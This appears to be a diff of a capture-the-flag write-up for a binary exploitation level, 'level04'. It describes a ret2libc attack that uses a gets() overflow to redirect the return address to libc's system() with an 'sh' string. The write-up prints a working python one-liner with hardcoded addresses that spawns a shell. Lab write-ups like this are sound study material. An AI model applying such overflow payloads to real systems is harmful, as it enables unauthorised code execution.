@@ -1,7 +1,16 @@
-we need to execute:
+
+after decompiling the binary we found a call to `gets()` in a child proccess
+we use it to overwrite `main()`'s return address with libc's `system()` address
+and write as parameter "sh" string extracted from the read-only string ".gnu.hash".
+ 
+
+to do this we need to execute:
+
 ```
 (python -c 'from struct import *; print "a"*156 + pack("I", 0xf7e6aed0) + "aaaa" + pack("I", 0x8048312)' ; cat) | ./level04
 ```
-0xf7e6aed0: system() address
-0x8048312: "sh" address
+
+addresses meanings:
+0xf7e6aed0: `system()` address
+0x8048312: "sh" string address
 
